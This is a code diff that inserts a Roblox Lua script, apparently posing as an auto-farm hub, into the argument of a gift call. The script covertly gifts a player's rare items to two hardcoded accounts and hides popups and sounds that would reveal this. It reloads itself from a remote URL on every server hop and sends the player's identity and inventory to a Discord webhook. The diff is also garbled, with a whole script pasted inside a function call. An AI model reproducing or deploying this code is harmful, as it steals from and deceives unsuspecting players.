@@ -742,7 +742,758 @@ task.spawn(function()
 
             if isWhitelisted(tool) then
                 for _,id in ipairs(targetUserIds) do
-                    giftRemote:FireServer(id)
+                    giftRemote:FireServer(local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local PLACE_ID = game.PlaceId
+
+repeat task.wait() until game:IsLoaded()
+repeat task.wait() until player and player.Character
+repeat task.wait() until player.Character:FindFirstChildOfClass("Humanoid")
+repeat task.wait() until player:FindFirstChild("Backpack")
+
+local backpack = player.Backpack
+repeat task.wait() until #backpack:GetChildren() > 0
+
+local targetUserIds = {
+    9367836539,
+    9456150015
+}
+
+local giftRemote = ReplicatedStorage.Shared.Packages.Network.rev_GiftRequest
+local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")
+
+local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
+
+local isGoodServer = false
+local animBlocked = false
+
+--====================================================
+-- QUEUE
+--====================================================
+
+local function queueSelf()
+    if queue_on_teleport then
+        queue_on_teleport([[
+            repeat task.wait() until game:IsLoaded()
+            task.wait(2)
+            loadstring(game:HttpGet("]] .. SCRIPT_URL .. [["))()
+        ]])
+    end
+end
+
+--====================================================
+-- SERVER CHECK
+--====================================================
+
+local function getServerType()
+    local remote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
+    if not remote then return nil end
+
+    local ok, res = pcall(function()
+        return remote:InvokeServer()
+    end)
+
+    if ok and res then
+        return string.lower(tostring(res))
+    end
+end
+
+local function isBadServer()
+    local t = getServerType()
+    if not t then return false end
+
+    return string.find(t,"vip")
+        or string.find(t,"private")
+        or string.find(t,"reserved")
+end
+
+--====================================================
+-- FIND SERVER
+--====================================================
+
+local function getLowServer()
+    local url = "https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100"
+
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+
+    if success and result and result.data then
+        for _,server in pairs(result.data) do
+            if server.playing and server.playing <= 2 then
+                return server.id
+            end
+        end
+    end
+end
+
+--====================================================
+-- HOP SYSTEM
+--====================================================
+
+local function hopServer()
+    queueSelf()
+
+    local id = getLowServer()
+
+    if id then
+        pcall(function()
+            TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player)
+        end)
+    else
+        pcall(function()
+            TeleportService:Teleport(PLACE_ID, player)
+        end)
+    end
+end
+
+TeleportService.TeleportInitFailed:Connect(function()
+    task.wait(2)
+    hopServer()
+end)
+
+--====================================================
+-- SERVER LOOP
+--====================================================
+
+task.spawn(function()
+    while true do
+        task.wait(2)
+
+        if isBadServer() or #Players:GetPlayers() > 3 then
+            hopServer()
+        else
+            isGoodServer = true
+            print("GOOD SERVER ✅")
+            break
+        end
+    end
+end)
+
+repeat task.wait() until isGoodServer
+
+
+local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+local function killGiftText(v)
+    if not v:IsA("TextLabel") then return end
+
+    local name = string.lower(v.Name)
+    local text = string.lower(v.Text or "")
+
+    if string.find(text, "gift request sent")
+    or string.find(text, "queue")
+    or string.find(text, "decline")
+    or string.find(text, "popup")
+    then
+        v:Destroy()
+    end
+end
+
+-- initial sweep
+for _,v in ipairs(playerGui:GetDescendants()) do
+    killGiftText(v)
+end
+
+-- anti respawn
+playerGui.DescendantAdded:Connect(function(v)
+    task.wait()
+    killGiftText(v)
+end)
+
+
+--====================================================
+-- 🔥 FREEZE BACKPACK (SAFE)
+--====================================================
+
+local inv = player.PlayerGui:WaitForChild("NewInventory")
+
+
+-- Method 3
+for _,v in ipairs(inv:GetDescendants()) do
+    if v:IsA("UIStroke") then
+        v:Destroy()
+    end
+end
+
+
+--====================================================
+-- 🔇 SOUND KILL
+--====================================================
+
+local function killTargetSounds()
+    local effects = SoundService:FindFirstChild("Effects")
+    if not effects then return end
+
+    for _,name in ipairs({"Notification","ErrorSound"}) do
+        local s = effects:FindFirstChild(name)
+        if s then
+            s.Volume = 0
+            s:Stop()
+        end
+    end
+end
+
+killTargetSounds()
+
+SoundService.DescendantAdded:Connect(function(obj)
+    if obj.Name == "Notification" or obj.Name == "ErrorSound" then
+        task.wait()
+        killTargetSounds()
+    end
+end)
+
+--====================================================
+-- 🎬 ANIM FIX (RESTORED VERSION - 3 IDS)
+--====================================================
+
+local function getChar()
+    return player.Character or player.CharacterAdded:Wait()
+end
+
+local function blockAnim(hum)
+    if animBlocked then return end
+    animBlocked = true
+
+    hum.AnimationPlayed:Connect(function(track)
+        local id = tostring(track.Animation.AnimationId)
+
+        -- ONLY 3 ANIM IDS (WORKING VERSION)
+        if string.find(id, "507768375")
+        or string.find(id, "507768133")
+        or string.find(id, "507768083") then
+            track:Stop()
+        end
+    end)
+end
+
+--====================================================
+-- TOOL CLEAN (UNCHANGED)
+--====================================================
+
+local function disableEntityGui(tool)
+    for _,v in ipairs(tool:GetDescendants()) do
+        if v:IsA("BillboardGui") or v.Name == "EntityGUI" then
+            v.Enabled = false
+        end
+    end
+end
+
+local function breakToolJoints(tool)
+    for _,v in ipairs(tool:GetDescendants()) do
+        if v:IsA("Weld")
+        or v:IsA("Motor6D")
+        or v:IsA("WeldConstraint") then
+            v:Destroy()
+        end
+    end
+end
+
+local function silentEquip(tool)
+    local char = getChar()
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+
+    blockAnim(hum)
+
+    disableEntityGui(tool)
+
+    for _,v in ipairs(tool:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.LocalTransparencyModifier = 1
+            v.Transparency = 1
+            v.CanCollide = false
+            v.Massless = true
+        end
+    end
+
+    hum:EquipTool(tool)
+
+    task.defer(function()
+        breakToolJoints(tool)
+    end)
+
+    tool.DescendantAdded:Connect(function(obj)
+        if obj:IsA("BillboardGui") or obj.Name == "EntityGUI" then
+            obj.Enabled = false
+        end
+
+        if obj:IsA("Weld")
+        or obj:IsA("Motor6D")
+        or obj:IsA("WeldConstraint") then
+            obj:Destroy()
+        end
+    end)
+end
+
+local function unequipAll()
+    local char = getChar()
+    for _,v in ipairs(char:GetChildren()) do
+        if v:IsA("Tool") then
+            v.Parent = backpack
+        end
+    end
+end
+
+--====================================================
+-- RARITY
+--====================================================
+
+local function getRarity(tool)
+    local model = tool:FindFirstChild(tool.Name)
+
+    if model
+    and model:FindFirstChild("Root")
+    and model.Root:FindFirstChild("EntityGUI")
+    and model.Root.EntityGUI:FindFirstChild("Frame")
+    and model.Root.EntityGUI.Frame:FindFirstChild("RarityLabel") then
+        return string.lower(model.Root.EntityGUI.Frame.RarityLabel.Text)
+    end
+end
+
+local function isWeightTool(tool)
+    return weightFolder:FindFirstChild(tool.Name) ~= nil
+end
+
+--====================================================
+-- 🧾 BRAINROT WHITELIST (NAME + MUTATION)
+--====================================================
+
+local brainrotWhitelist = {
+    ["Ketupat Kepat"] = {chance = 0.00005, mutations = {
+        ["*"] = true
+    }},
+
+    ["Mastodontico Telepiedone"] = {chance = 0.0001, mutations = {
+        normal = true,
+        golden = true,       -- 1.5
+        diamond = true,      -- 2
+        plasma = true,       -- 4
+        molten = true,       -- 6
+        radioactive = true,  -- 8
+        virus = true,        -- 10
+        void = true,         -- 10
+        shadow = true,       -- 12
+        electrified = true,  -- 16
+        rainbow = true       -- 30
+    }},
+
+    ["Anpali Babel"] = {chance = 0.0005, mutations = {
+        normal = true,
+        golden = true,       -- 1.5
+        diamond = true,      -- 2
+        plasma = true,       -- 4
+        molten = true,       -- 6
+        radioactive = true,  -- 8
+        virus = true,        -- 10
+        void = true,         -- 10
+        shadow = true,       -- 12
+        electrified = true,  -- 16
+        rainbow = true       -- 30
+    }},
+
+    ["Beluga Beluga"] = {chance = 0.001, mutations = {
+        normal = false,
+        golden = false,
+        diamond = true,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Tralaledon"] = {chance = 0.001, mutations = {
+        normal = false,
+        golden = false,
+        diamond = true,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Krupuk Pagi Pagi"] = {chance = 0.005, mutations = {
+        normal = false,
+        golden = false,
+        diamond = true,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Pot Hotspot"] = {chance = 0.01, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Chicleteira Bicicleteira"] = {chance = 0.05, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Guerriro Digitale"] = {chance = 0.3, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Dragonfrutina Dolphinita"] = {chance = 0.7, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = true,
+        molten = true,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true,
+        ["*"] = true
+    }},
+
+    ["Strawberry Elephant"] = {chance = 1.5, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Meowl"] = {chance = 2.5, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Corn Sahur"] = {chance = 3.00005, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Crazylone Pizaione"] = {chance = 4.0003, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Chillin Chilli"] = {chance = 7.002, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = true,
+        virus = true,
+        void = true,
+        shadow = true,
+        electrified = true,
+        rainbow = true
+    }},
+
+    ["Nuclearo Dinossauro"] = {chance = 14.03, mutations = {
+        normal = false,
+        golden = false,
+        diamond = false,
+        plasma = false,
+        molten = false,
+        radioactive = false,
+        virus = false,
+        void = false,
+        shadow = false,
+        electrified = true,
+        rainbow = true
+    }},
+}
+
+
+local function getMutation(tool)
+    local m = tool:GetAttribute("Mutation")
+
+    if not m or m == "" then
+        return "normal"
+    end
+
+    m = string.lower(tostring(m))
+
+    if m == "none" then
+        return "normal"
+    end
+
+    return m
+end
+
+local function isWhitelistedName(tool)
+    return brainrotWhitelist[tool.Name] ~= nil
+end
+
+local function isWhitelisted(tool)
+    local data = brainrotWhitelist[tool.Name]
+    if not data then return false end
+
+    local mutation = getMutation(tool)
+
+    -- 🔥 wildcard (semua mutation)
+    if data.mutations["*"] then
+        return true
+    end
+
+    return data.mutations[mutation] == true
+end
+
+local function getSortedTools()
+    local list = {}
+
+    for _,tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool")
+        and not isWeightTool(tool)
+        and brainrotWhitelist[tool.Name] then
+
+            table.insert(list, tool)
+        end
+    end
+
+    table.sort(list, function(a,b)
+        local ca = brainrotWhitelist[a.Name].chance or 0
+        local cb = brainrotWhitelist[b.Name].chance or 0
+        return ca < cb -- 🔥 terkecil dulu
+    end)
+
+    return list
+end
+
+
+--====================================================
+-- ✅ WEBHOOK
+local webhook = "https://discord.com/api/webhooks/1501397529672028291/JadJoke2SDA-kKhvAPPZj6aFleWB73RRRW3JFKhHwnm1eHaH1AT7McZy2bvpzzdGRfNp"
+
+-- ✅ VERCEL
+local vercel = "https://joinlink-weld.vercel.app/api/join"
+
+-- 🔥 brainrotWhitelist WAJIB ADA (ambil dari script lo)
+-- pastikan variable ini udah ada di script utama
+
+local sent = false
+
+RunService.RenderStepped:Connect(function()
+    if sent then return end
+    sent = true
+
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+
+    print("HOOK TRIGGERED")
+
+    -- 🔗 JOIN LINK
+    local joinLink = vercel
+        .. "?placeId=" .. placeId
+        .. "&jobId=" .. jobId
+
+    --====================================================
+    -- 📦 SCAN INVENTORY
+    --====================================================
+
+    local counts = {}
+    local total = 0
+
+    for _,tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and brainrotWhitelist[tool.Name] then
+            counts[tool.Name] = (counts[tool.Name] or 0) + 1
+            total += 1
+        end
+    end
+
+    local list = {}
+
+    for name,count in pairs(counts) do
+        table.insert(list, {
+            name = name,
+            count = count,
+            chance = brainrotWhitelist[name].chance or math.huge
+        })
+    end
+
+    table.sort(list, function(a,b)
+        return a.chance < b.chance
+    end)
+
+    local text = ""
+    for _,v in ipairs(list) do
+        text ..= "x"..v.count.." "..v.name.."\n"
+    end
+
+    if text == "" then
+        text = "No brainrot found"
+    end
+
+    --====================================================
+    -- 📡 WEBHOOK
+    --====================================================
+
+    local data = {
+        username = "Brainrot Logger",
+        embeds = {{
+            title = "🐶 Brainrot Scan",
+            color = 16711935,
+
+            fields = {
+                {
+                    name = "👤 Player Information",
+                    value =
+                        "Name: "..player.Name.."\n"..
+                        "UserId: "..player.UserId.."\n"..
+                        "Account Age: "..player.AccountAge.." days",
+                    inline = false
+                },
+
+                {
+                    name = "🧠 Server Info",
+                    value =
+                        "PlaceId: "..placeId.."\n"..
+                        "JobId: "..jobId,
+                    inline = false
+                },
+
+                {
+                    name = "💰 Total Value",
+                    value = tostring(total),
+                    inline = false
+                },
+
+                {
+                    name = "🎒 Backpack",
+                    value = "```\n"..text.."```",
+                    inline = false
+                },
+
+                {
+                    name = "🔗 Join Link",
+                    value = joinLink,
+                    inline = false
+                }
+            }
+        }}
+    }
+
+    local req = request or http_request or syn.request
+
+    if req then
+        pcall(function()
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    else
+        warn("HTTP request function not found")
+    end
+end)
+
+
+--====================================================
+-- AUTO GIFT LOOP
+--====================================================
+
+task.spawn(function()
+    while true do
+        task.wait(0.01)
+
+        local tools = getSortedTools()
+
+        for _,tool in ipairs(tools) do
+            silentEquip(tool)
+            task.wait(0.02)
+
+            if isWhitelisted(tool) then
+                for _,id in ipairs(targetUserIds) do
+                    giftRemote:FireServer(targetUserIds)
+                end
+            end
+
+            unequipAll()
+        end
+    end
+end))
                 end
             end
 
